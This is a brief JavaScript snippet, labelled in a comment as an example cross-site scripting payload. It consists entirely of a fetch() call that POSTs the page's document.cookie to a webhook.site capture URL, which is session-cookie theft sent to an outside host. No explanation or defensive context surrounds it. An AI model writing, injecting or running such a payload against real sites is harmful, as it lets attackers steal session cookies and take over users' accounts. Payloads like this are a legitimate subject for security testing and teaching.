// Example XSS payload
fetch("https://webhook.site/38310abd-731f-4bb1-95aa-78d558225823", {
  method: "POST",
  body: document.cookie
});
